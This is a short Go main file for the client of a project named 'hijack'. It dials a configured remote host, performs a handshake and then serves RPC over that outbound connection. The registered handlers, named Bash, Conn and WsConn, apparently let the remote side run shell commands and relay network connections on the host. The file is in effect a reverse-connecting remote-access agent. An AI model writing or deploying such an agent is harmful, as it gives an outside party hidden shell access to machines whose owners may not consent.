package main

import (
	"log"
	"net/rpc"

	"github.com/invctrl/hijack/client/config"
	"github.com/invctrl/hijack/client/dial"
	"github.com/invctrl/hijack/protocol"
)

func main() {
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	c := config.Init()
	conn := dial.Dial(c)
	c.Id = dial.Handshake(conn)
	config.Default = c

	/* subsequent call
	        conn := dialRemote(config.Default)
		handshake(conn)
	*/

	log.Println("connected:", c.Id)

	rpcServer := rpc.NewServer()
	rpcServer.Register(new(protocol.Hello))
	rpcServer.Register(new(protocol.Bash))
	rpcServer.Register(new(protocol.Conn))
	rpcServer.Register(new(protocol.WsConn))
	log.Println("serveconn")
	rpcServer.ServeConn(conn)
	log.Fatalln("bye")
}
